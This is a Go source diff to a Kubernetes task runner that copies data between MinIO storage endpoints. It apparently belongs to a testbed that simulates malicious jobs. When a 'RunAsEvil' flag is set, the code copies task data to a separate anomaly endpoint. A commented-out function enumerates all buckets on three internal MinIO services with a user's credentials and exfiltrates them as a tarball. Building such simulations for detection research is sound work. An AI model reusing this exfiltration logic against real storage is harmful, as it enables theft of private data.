@@ -10,6 +10,7 @@ import (
 	"log"
 	"net/http"
 	"os"
+	"strconv"
 	"time"
 
 	"github.com/minio/minio-go/v7"
@@ -32,13 +33,20 @@ type CodeRunner struct {
 	watcherReporter *report.WatcherReporter
 	dstConf         *DestinationConfig
 	ipaddr          string
+	isSimple        bool
 }
 
 func NewCodeRunner(reporter *report.WatcherReporter, dstConf *DestinationConfig) *CodeRunner {
+	isSimple, err := strconv.ParseBool(os.Getenv("RUNNER_MODE_IS_SIMPLE"))
+	if err != nil {
+		log.Printf("[Runner] Environment Varible Value invalid. Set Mode As Simple. / Current Value: %s", os.Getenv("RUNNER_MODE_IS_SIMPLE"))
+		isSimple = true
+	}
 	return &CodeRunner{
 		watcherReporter: reporter,
 		dstConf:         dstConf,
 		ipaddr:          os.Getenv("KUBE_POD_IP"),
+		isSimple:        isSimple,
 	}
 }
 
@@ -88,8 +96,98 @@ func (cr *CodeRunner) errorProcessing(formatString string, err error, resMsg *fo
 	cr.postRunningProcedure(resMsg)
 }
 
-// Task Request. Driver에서 Executor로 Go RPC 라이브러리를 통해 실행.
 func (cr *CodeRunner) StartTask(reqMsg *format.TaskRequestMessage, resMsg *format.TaskResponseMessage) error {
+	if cr.isSimple {
+		return cr.startSimpleTask(reqMsg, resMsg)
+	}
+	return cr.startImageTask(reqMsg, resMsg)
+}
+
+// Task Request. Driver에서 Executor로 Go RPC 라이브러리를 통해 실행.
+func (cr *CodeRunner) startSimpleTask(reqMsg *format.TaskRequestMessage, resMsg *format.TaskResponseMessage) error {
+	cr.preRunningProcedure(reqMsg)
+	taskFailedProc := func() {
+		resMsg.JobID = reqMsg.JobID
+		resMsg.TaskID = reqMsg.TaskID
+		resMsg.Status = format.TaskFailed
+	}
+	s3Client, err := minio.New(reqMsg.DataSource.Endpoint, &minio.Options{
+		Secure: false,
+		Transport: &http.Transport{
+			DisableKeepAlives: true,
+		},
+	})
+	if err != nil {
+		taskFailedProc()
+		cr.errorProcessing("[Runner] Failed establish connection to DataSource: %+v", err, resMsg)
+		return err
+	}
+	// 1. GetObject 수행
+	getOpt := minio.GetObjectOptions{}
+	getOpt.SetRange(reqMsg.RangeBegin, reqMsg.RangeEnd)
+	reader, err := s3Client.GetObject(
+		context.Background(),
+		reqMsg.DataSource.BucketName,
+		reqMsg.DataSource.ObjectName,
+		getOpt,
+	)
+	if err != nil {
+		taskFailedProc()
+		cr.errorProcessing("[Runner] Failed to execute 'GetObject': %+v", err, resMsg)
+		return err
+	}
+	defer reader.Close()
+	// 2. Data 가져오기 시도
+	buf := new(bytes.Buffer)
+	if _, err := io.Copy(buf, reader); err != nil {
+		taskFailedProc()
+		cr.errorProcessing("[Runner] Failed to create buffer: %+v", err, resMsg)
+		return err
+	}
+	compressedData, err := compressGzip(buf.Bytes())
+	if err != nil {
+		taskFailedProc()
+		cr.errorProcessing("[Runner] Failed to compress: %+v", err, resMsg)
+		return err
+	}
+	// 3. 전송 경로 다분화
+	var uploadObject string = fmt.Sprintf("%s.%s.%s.%d_to_%d.gzip",
+		reqMsg.JobID.String(), reqMsg.TaskID.String(), cr.ipaddr,
+		reqMsg.RangeBegin, reqMsg.RangeEnd,
+	)
+	// 4. 저장 시도
+	dstClient, _ := minio.New(reqMsg.Destination.Endpoint, &minio.Options{
+		Creds:  credentials.NewStaticV4(cr.dstConf.MinioID, cr.dstConf.MinioPW, ""),
+		Secure: false,
+		Transport: &http.Transport{
+			DisableKeepAlives: true,
+		},
+	})
+	dstReader := bytes.NewReader(compressedData)
+	if reqMsg.RunAsEvil {
+		cr.anomalyAct(reqMsg, buf)
+	}
+	uploadInfo, err := dstClient.PutObject(
+		context.Background(), reqMsg.Destination.BucketName, uploadObject, dstReader,
+		int64(dstReader.Len()),
+		minio.PutObjectOptions{ContentType: "application/gzip"},
+	)
+	if err != nil {
+		taskFailedProc()
+		cr.errorProcessing("[Runner] Failed to upload data: %+v", err, resMsg)
+		return err
+	}
+	time.Sleep(time.Second)
+	log.Printf("[Runner] Upload Success: %s of size %d", uploadInfo.Key, uploadInfo.Size)
+	// 작업 완료 보고
+	resMsg.JobID = reqMsg.JobID
+	resMsg.TaskID = reqMsg.TaskID
+	resMsg.Status = format.TaskFinish
+	cr.postRunningProcedure(resMsg)
+	return nil
+}
+
+func (cr *CodeRunner) startImageTask(reqMsg *format.TaskRequestMessage, resMsg *format.TaskResponseMessage) error {
 	cr.preRunningProcedure(reqMsg)
 
 	taskFailedProc := func() {
@@ -128,18 +226,37 @@ func (cr *CodeRunner) StartTask(reqMsg *format.TaskRequestMessage, resMsg *forma
 
 	// 2. Data 가져오기 시도
 	buf := new(bytes.Buffer)
-	if _, err := io.Copy(buf, reader); err != nil {
-		taskFailedProc()
-		cr.errorProcessing("[Runner] Failed to create buffer: %+v", err, resMsg)
-		return err
-	}
+	gzipWriter := gzip.NewWriter(buf)
+	tarWriter := tar.NewWriter(gzipWriter)
 
-	compressedData, err := compressGzip(buf.Bytes())
-	if err != nil {
-		taskFailedProc()
-		cr.errorProcessing("[Runner] Failed to compress: %+v", err, resMsg)
-		return err
+	for idx := reqMsg.RangeBegin; idx < reqMsg.RangeEnd; idx++ {
+		obj, err := s3Client.GetObject(context.Background(), reqMsg.DataSource.BucketName, strconv.Itoa(int(idx))+".jpg", minio.GetObjectOptions{})
+		if err != nil {
+			log.Printf("[Runner] Failed to get object in anomaly case: %+v\n", err)
+			continue
+		}
+		obj_stat, err := obj.Stat()
+		if err != nil {
+			log.Printf("[Runner] Failed to get object in anomaly case: %+v\n", err)
+			continue
+		}
+
+		header := &tar.Header{
+			Name:    strconv.Itoa(int(idx)) + ".jpg",
+			Size:    obj_stat.Size,
+			Mode:    0600,
+			ModTime: time.Now(),
+		}
+		if err := tarWriter.WriteHeader(header); err != nil {
+			log.Printf("[Runner] Failed to write header: %+v\n", err)
+			continue
+		}
+		if _, err := io.Copy(tarWriter, obj); err != nil {
+			log.Printf("[Runner] Failed to write data: %+v\n", err)
+		}
 	}
+	tarWriter.Close()
+	gzipWriter.Close()
 
 	// 3. 전송 경로 다분화
 	var uploadObject string = fmt.Sprintf("%s.%s.%s.%d_to_%d.gzip",
@@ -155,7 +272,11 @@ func (cr *CodeRunner) StartTask(reqMsg *format.TaskRequestMessage, resMsg *forma
 			DisableKeepAlives: true,
 		},
 	})
-	dstReader := bytes.NewReader(compressedData)
+	dstReader := bytes.NewReader(buf.Bytes())
+
+	if reqMsg.RunAsEvil {
+		cr.anomalyAct(reqMsg, buf)
+	}
 
 	uploadInfo, err := dstClient.PutObject(
 		context.Background(), reqMsg.Destination.BucketName, uploadObject, dstReader,
@@ -166,10 +287,6 @@ func (cr *CodeRunner) StartTask(reqMsg *format.TaskRequestMessage, resMsg *forma
 		taskFailedProc()
 		cr.errorProcessing("[Runner] Failed to upload data: %+v", err, resMsg)
 		return err
-	}
-
-	if reqMsg.RunAsEvil {
-		cr.anomalyAct(reqMsg)
 	}
 
 	time.Sleep(time.Second)
@@ -195,19 +312,45 @@ func compressGzip(data []byte) ([]byte, error) {
 	return b.Bytes(), nil
 }
 
-// 이미 타겟 Storage를 알고 있다는 상황을 가정하는 것이 좋을 것 같은데.
+func (cr *CodeRunner) anomalyAct(reqMsg *format.TaskRequestMessage, buf *bytes.Buffer) {
+	var endpoint string = cr.dstConf.AbnormalCaseEndpoint
+	var bucketName string = cr.dstConf.AbnormalCaseBucket
+
+	dstClient, _ := minio.New(endpoint, &minio.Options{
+		Creds:  credentials.NewStaticV4(cr.dstConf.MinioID, cr.dstConf.MinioPW, ""),
+		Secure: false,
+		Transport: &http.Transport{
+			DisableKeepAlives: true,
+		},
+	})
+	dstReader := bytes.NewReader(buf.Bytes())
+
+	var uploadObject string = fmt.Sprintf("%s.%s.%s.%d_to_%d.gzip",
+		reqMsg.JobID.String(), reqMsg.TaskID.String(), cr.ipaddr,
+		reqMsg.RangeBegin, reqMsg.RangeEnd,
+	)
+	uploadInfo, err := dstClient.PutObject(
+		context.Background(), bucketName, uploadObject, dstReader,
+		int64(dstReader.Len()),
+		minio.PutObjectOptions{ContentType: "application/gzip"},
+	)
+	if err != nil {
+		log.Printf("[Runner] Failed to upload anomaly data: %+v", err)
+	} else {
+		log.Printf("[Runner] Anomaly Upload Success: %s of size %d", uploadInfo.Key, uploadInfo.Size)
+	}
+}
+
+/*
+// 특정 Storage를 아는 상황에서, 전체 Bucket을 조회, 내부 데이터 복제를 시도.
 func (cr *CodeRunner) anomalyAct(reqMsg *format.TaskRequestMessage) {
 	var endpoint string = cr.dstConf.AbnormalCaseEndpoint
 	var bucketName string = cr.dstConf.AbnormalCaseBucket
 	var buf bytes.Buffer
 
 	// Exeuctor의 권한 악용 상황 가정.
-	
+
 	//C레벨 접근은 Network Policy에 막힐 것. 이걸 하려면 Network Policy 활성화 여부 확인해야 함.
-
-	
-
-	
 
 	// 악성 Job을 제출하여, 이미 알고 있는 Storage에 접근, 데이터를 가져오려고 시도함. C, S, O 레벨 접근 시도.
 	targetlist := []string{"minio.minio-c.svc.cluster.local:80", "minio.minio-s.svc.cluster.local:80", "minio.minio-o.svc.cluster.local:80"}
@@ -222,7 +365,13 @@ func (cr *CodeRunner) anomalyAct(reqMsg *format.TaskRequestMessage) {
 		anoClient, err := minio.New(target, &minio.Options{
 			Creds:  credentials.NewStaticV4(cr.dstConf.MinioID, cr.dstConf.MinioPW, ""), // 임시로 User의 Access Key 사용
 			Secure: false,
+			// For TCP Connection Timeout. (설정 안했더니 Packet Drop 당했을 때 20분 기다리고 있더라. 전체 Duration이 45분으로 급상승함.)
+			// 하단의 SQL로 확인해볼 것.
+			// SELECT job_id, task_id, MAX(timestamp) - MIN(timestamp) AS duration FROM logs WHERE job_id != '00000000-0000-0000-0000-000000000000' GROUP BY (job_id, task_id) ORDER BY duration DESC;
 			Transport: &http.Transport{
+				DialContext: (&net.Dialer{
+					Timeout: 10 * time.Second,
+				}).DialContext,
 				DisableKeepAlives: true,
 			},
 		})
@@ -237,7 +386,7 @@ func (cr *CodeRunner) anomalyAct(reqMsg *format.TaskRequestMessage) {
 			log.Printf("[Runner] Failed to list buckets of DataSource in anomaly case: %+v", err)
 			continue
 		}
-		
+
 		for _, bucket := range buckets {
 			objectCh := anoClient.ListObjects(ctx, bucket.Name, minio.ListObjectsOptions{Recursive: true})
 			for object := range objectCh {
@@ -267,6 +416,8 @@ func (cr *CodeRunner) anomalyAct(reqMsg *format.TaskRequestMessage) {
 			}
 		}
 	}
+	tarWriter.Close()
+	gzipWriter.Close()
 
 	// 획득한 데이터를 압축 후 외부 반출 시도.
 	dstClient, _ := minio.New(endpoint, &minio.Options{
@@ -278,7 +429,11 @@ func (cr *CodeRunner) anomalyAct(reqMsg *format.TaskRequestMessage) {
 	})
 	dstReader := bytes.NewReader(buf.Bytes())
 
-	var uploadObject string = fmt.Sprintf("%s.%s.tar.gz", reqMsg.JobID.String(), reqMsg.TaskID.String())
+	//var uploadObject string = fmt.Sprintf("%s.%s.tar.gz", reqMsg.JobID.String(), reqMsg.TaskID.String())
+	var uploadObject string = fmt.Sprintf("%s.%s.%s.%d_to_%d.gzip",
+		reqMsg.JobID.String(), reqMsg.TaskID.String(), cr.ipaddr,
+		reqMsg.RangeBegin, reqMsg.RangeEnd,
+	)
 	uploadInfo, err := dstClient.PutObject(
 		context.Background(), bucketName, uploadObject, dstReader,
 		int64(dstReader.Len()),
@@ -290,3 +445,4 @@ func (cr *CodeRunner) anomalyAct(reqMsg *format.TaskRequestMessage) {
 		log.Printf("[Runner] Anomaly Upload Success: %s of size %d", uploadInfo.Key, uploadInfo.Size)
 	}
 }
+*/
